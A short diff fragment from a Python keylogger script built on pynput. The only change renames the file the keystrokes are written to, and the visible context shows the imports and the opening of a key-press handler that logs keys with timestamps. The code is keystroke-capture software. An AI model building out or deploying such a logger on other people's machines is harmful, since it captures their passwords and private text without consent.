@@ -2,7 +2,7 @@ from pynput import keyboard
 from datetime import datetime
 
 # Define the file where the logs will be saved
-log_file = "keylog_recorders.txt"
+log_file = "keylog_records.txt"
 
 # Function to write the key to the file with a timestamp
 def on_press(key):
